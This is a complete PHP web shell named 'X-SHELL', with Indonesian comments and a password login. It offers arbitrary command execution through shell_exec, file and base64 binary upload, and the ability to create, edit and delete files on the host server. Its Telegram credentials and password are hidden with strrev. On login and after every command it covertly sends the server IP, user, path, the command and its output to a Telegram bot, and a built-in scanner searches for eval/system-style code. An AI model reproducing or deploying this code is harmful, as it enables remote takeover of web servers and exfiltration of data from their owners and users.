<?php
// ============== LIGHTWEIGHT X-SHELL ==============
error_reporting(0);
set_time_limit(0);
session_start();

// --- Konfigurasi (strrev obfuscated) ---
$tkn = strrev('ARcAukVsktLmb0acWwz9XFQFM0WWdNGdZQHAA:4474604368');
$cid = strrev('3644710398');
$pwd = strrev('lbt');

// --- Fungsi kirim Telegram async (non-blocking) ---
function _sendTelegram($msg) {
    global $tkn, $cid;
    $url = "https://api.telegram.org/bot{$tkn}/sendMessage";
    $post = http_build_query(['chat_id'=>$cid, 'text'=>$msg, 'parse_mode'=>'HTML']);
    $parts = parse_url($url);
    $host = $parts['host'];
    $path = isset($parts['path']) ? $parts['path'] : '/';
    $fp = @fsockopen('ssl://'.$host, 443, $errno, $errstr, 1);
    if ($fp) {
        stream_set_blocking($fp, false);
        $out = "POST $path HTTP/1.1\r\n";
        $out .= "Host: $host\r\n";
        $out .= "Content-Type: application/x-www-form-urlencoded\r\n";
        $out .= "Content-Length: ".strlen($post)."\r\n";
        $out .= "Connection: Close\r\n\r\n";
        $out .= $post;
        fwrite($fp, $out);
        fclose($fp);
    }
}

// --- Login ---
$password = $pwd;
if (isset($_GET['logout'])) { unset($_SESSION['login']); header("Location: ?"); exit; }
if (!isset($_SESSION['login'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $password) {
        $_SESSION['login'] = true;
        // Kirim notifikasi login (async, tidak memperlambat)
        $ip = $_SERVER['SERVER_ADDR'] . ' ('.$_SERVER['REMOTE_ADDR'].')';
        _sendTelegram("✅ Login X-SHELL\nIP: $ip\nUser: ".get_current_user()."\nPath: ".getcwd());
    } else {
        die("<body style='background:#000;color:red;text-align:center;padding-top:100px;font-family:monospace;'><form method='post'><h1>[ X-SHELL LOGIN ]</h1><input type='password' name='pass' style='background:#111;color:#0f0;border:1px solid red;'><br><br><input type='submit' value='ENTER'></form></body>");
    }
}

// --- Path & OS ---
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = str_replace('\\', '/', $path);
$os = (stripos(PHP_OS, 'WIN') === 0) ? 'Windows' : 'Linux';

// --- Style ---
echo "<style>
body{background:#000;color:#0f0;font-family:'Courier New',monospace;font-size:12px;padding:15px;}
.box{border:1px solid red;padding:10px;margin-bottom:10px;background:rgba(10,10,10,0.9);box-shadow:0 0 5px red;}
a{color:cyan;text-decoration:none;}a:hover{color:red;}
table{width:100%;border-collapse:collapse;}
th,td{border:1px solid #333;padding:5px;text-align:left;}
th{background:red;color:#000;}
input,textarea{background:#111;color:#0f0;border:1px solid #444;padding:3px;}
.btn{background:red;color:#fff;border:none;cursor:pointer;padding:3px 10px;}
</style>";

echo "<h2>[ X-ULTIMATE SHELL ]</h2>";
echo "<div class='box'>OS: $os | IP: {$_SERVER['SERVER_ADDR']} | USER: ".get_current_user()." | <a href='?logout=1'>[ LOGOUT ]</a></div>";

// --- Breadcrumb cepat ---
$parts = explode('/', $path);
$bread = '';
$cum = '';
foreach ($parts as $p) {
    $cum .= ($cum ? '/' : '') . $p;
    $bread .= "<a href='?path=$cum'>$p</a>/";
}
echo "<div class='box'>PATH: $bread</div>";

// --- Tools & Upload ---
echo "<div class='box'>
<form method='POST' enctype='multipart/form-data'>
<b>UPLOAD:</b> <input type='file' name='f'> <input type='submit' name='up' value='FORCE UP' class='btn'>
</form>
<hr style='border:0.5px solid #333;'>
<b>TOOLS:</b> <a href='?path=$path&tool=scanner'>[ SCANNER ]</a> | <a href='?path=$path&tool=cmd'>[ CMD ]</a>
</div>";

// --- Create Folder & File ---
echo "<div class='box'>
<form method='POST' style='display:inline-block;margin-right:20px;'>
<b>FOLDER:</b> <input type='text' name='fn' placeholder='Name' style='width:120px;'> <input type='submit' name='cf' value='Create' class='btn'>
</form>
<form method='POST' style='display:inline-block;'>
<b>FILE:</b> <input type='text' name='fi' placeholder='Name' style='width:120px;'> <textarea name='fc' placeholder='Content' style='width:150px;height:30px;vertical-align:middle;'></textarea> <input type='submit' name='cr' value='Create' class='btn'>
</form>
</div>";

// --- Binary Upload Base64 ---
echo "<div class='box'>
<b>BINARY (Base64):</b>
<form method='POST'>
File: <input type='text' name='bn' style='width:150px;'> <textarea name='bd' style='width:60%;height:50px;'></textarea> <input type='submit' name='bu' value='Upload' class='btn'>
</form>
</div>";

// --- Handler: Folder ---
if (isset($_POST['cf']) && !empty($_POST['fn'])) {
    $f = $path . '/' . trim($_POST['fn']);
    if (!file_exists($f) && @mkdir($f, 0777, true))
        echo "<div class='box' style='color:lime;'>[+] Folder created: $f</div>";
    else echo "<div class='box' style='color:red;'>[-] Failed</div>";
}

// --- Handler: File ---
if (isset($_POST['cr']) && !empty($_POST['fi'])) {
    $f = $path . '/' . trim($_POST['fi']);
    if (!file_exists($f) && @file_put_contents($f, $_POST['fc']))
        echo "<div class='box' style='color:lime;'>[+] File created: $f</div>";
    else echo "<div class='box' style='color:red;'>[-] Failed</div>";
}

// --- Handler: Binary Upload ---
if (isset($_POST['bu']) && !empty($_POST['bn'])) {
    $data = base64_decode($_POST['bd']);
    if ($data !== false) {
        $f = $path . '/' . trim($_POST['bn']);
        if (@file_put_contents($f, $data))
            echo "<div class='box' style='color:lime;'>[+] Binary uploaded: $f (".strlen($data)." B)</div>";
        else echo "<div class='box' style='color:red;'>[-] Write failed</div>";
    } else echo "<div class='box' style='color:red;'>[-] Invalid base64</div>";
}

// --- Upload Normal ---
if (isset($_POST['up']) && isset($_FILES['f'])) {
    $d = $path . '/' . $_FILES['f']['name'];
    @chmod($path, 0777);
    if (@copy($_FILES['f']['tmp_name'], $d) || @move_uploaded_file($_FILES['f']['tmp_name'], $d) || @file_put_contents($d, file_get_contents($_FILES['f']['tmp_name'])))
        echo "<div class='box' style='color:lime;'>[+] Uploaded: ".basename($d)." (".filesize($d)." B)</div>";
    else echo "<div class='box' style='color:red;'>[-] Upload failed</div>";
}

// --- Scanner Tool ---
if (isset($_GET['tool']) && $_GET['tool'] === 'scanner') {
    echo "<div class='box'><h3>[ SCANNER ]</h3>";
    $dh = @opendir($path);
    if ($dh) {
        while (($f = readdir($dh)) !== false) {
            if ($f === '.' || $f === '..') continue;
            $full = $path . '/' . $f;
            if (is_file($full)) {
                $c = file_get_contents($full);
                if (preg_match('/(base64_decode|eval|system|shell_exec|passthru)/i', $c))
                    echo "<font color='yellow'>[!] $f (suspicious)</font><br>";
            }
        }
        closedir($dh);
    }
    echo "</div>";
}

// --- CMD Tool ---
if (isset($_GET['tool']) && $_GET['tool'] === 'cmd') {
    echo "<div class='box'><form method='POST'>CMD: <input type='text' name='c' style='width:70%;'> <input type='submit' value='EXEC' class='btn'></form>";
    if (isset($_POST['c']) && $_POST['c'] !== '') {
        $out = shell_exec($_POST['c'] . ' 2>&1');
        echo "<pre style='color:white;'>$out</pre>";
        // Kirim notifikasi async
        _sendTelegram("🔧 CMD: ".$_POST['c']."\nOutput:\n".substr($out,0,400));
    }
    echo "</div>";
}

// --- File Manager (optimasi: opendir) ---
echo "<table><tr><th>NAME</th><th>SIZE</th><th>ACT</th></tr>";
$dh = @opendir($path);
if ($dh) {
    while (($item = readdir($dh)) !== false) {
        if ($item === '.' || $item === '..') continue;
        $full = $path . '/' . $item;
        $isdir = is_dir($full);
        echo "<tr>
        <td>".($isdir ? "<a href='?path=$full'>[ $item ]</a>" : $item)."</td>
        <td>".($isdir ? 'DIR' : filesize($full).' B')."</td>
        <td><a href='?path=$path&act=edit&item=$full'>Edit</a> | <a href='?path=$path&act=del&item=$full'>Del</a></td>
        </tr>";
    }
    closedir($dh);
}
echo "</table>";

// --- Edit & Delete ---
if (isset($_GET['act'])) {
    if ($_GET['act'] === 'edit') {
        if (isset($_POST['s'])) {
            @file_put_contents($_GET['item'], $_POST['t']);
            echo "SAVED!";
        }
        echo "<div class='box'><form method='POST'><textarea name='t' style='width:100%;height:200px;'>".htmlspecialchars(file_get_contents($_GET['item']))."</textarea><br><input type='submit' name='s' value='SAVE' class='btn'></form></div>";
    }
    if ($_GET['act'] === 'del') {
        @is_dir($_GET['item']) ? @rmdir($_GET['item']) : @unlink($_GET['item']);
        echo "<script>window.location='?path=$path';</script>";
    }
}
?>
